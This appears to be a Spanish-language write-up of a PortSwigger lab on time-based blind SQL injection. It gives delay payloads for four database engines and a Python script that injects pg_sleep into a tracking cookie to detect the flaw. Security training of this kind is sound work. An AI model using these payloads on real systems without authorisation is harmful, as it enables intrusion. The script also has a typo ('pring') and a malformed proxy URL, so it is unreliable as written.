---
title: "13 Blind SQL injection with time delays"
collection: publications
category: portswigger
permalink: /publications/13_Blind SQL injection with time delays
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. Para resolver el laboratorio, explotamos la vulnerabilidad de inyección SQL basada en el tiempo para provocar un retraso de 10 segundos.'
date: 2024-12-02
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind SQL injection with time delays'
---

![logo]({{site.url}}/images/SQLi/sqli-13/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-13/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, explota la vulnerabilidad de inyección SQL para provocar un retraso de 10 segundos.

## Analisis del campo vulnerable

En esta ocación vamos a probar el `TrackingId` si es vulnerable a Blind SQLi basado en tiempo. Necesitamos averiguar que Motor de BD es. Y vemos que es un `PostgreSQL`

![Cheat]({{site.url}}/images/SQLi/sqli-13/cheat.png)

```sql
' || (SELECT pg_sleep(10))--                                -> Payload para BD PostgreSQL   ✅
' || (SELECT sleep(10))--                                   -> Payload para BD MySQL   ❌
' || (SELECT dbms_pipe.receive_message(('a'), 10))--        -> Payload para BD Oracle   ❌
' || WAITFOR DELAY '0:0:10'--                               -> Payload para BD SQL Server   ❌
```

![Tiempo]({{site.url}}/images/SQLi/sqli-13/tiempo.png)

## Aprobado

![Aprobado]({{site.url}}/images/SQLi/sqli-13/aprobado.png)

# Codigo Python

```python

import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http:127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'fY3mWGvtddfW37rS' + sqli_payload_encoded, 'session': '3tjAqEsmAUv1oSufDDKMp8Dpr9LKqwcd'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds()) > 10:
        print("(+) Vulnerable to blind-based SQL injection")
    else:
        print("(-) Not vulnerable to blind based SQL injection")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        pring("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Checking if tracking cookie is vulnerable to time-based blind SQLi....")
    blind_sqli_check(url)

if __name__ == "__main__":
    main()

```